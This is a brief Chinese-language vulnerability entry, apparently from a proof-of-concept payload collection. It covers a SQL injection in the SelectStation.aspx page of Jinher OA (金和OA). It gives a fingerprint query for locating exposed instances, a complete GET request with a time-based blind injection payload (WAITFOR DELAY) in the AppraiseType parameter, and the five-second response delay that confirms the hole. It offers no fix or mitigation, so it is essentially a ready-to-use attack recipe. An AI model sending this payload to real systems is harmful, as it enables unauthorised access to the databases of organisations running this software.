# 金和OASelectStation.aspx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/Jhsoft.Web.Appraise/SelectStation.aspx/?AppraiseType=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s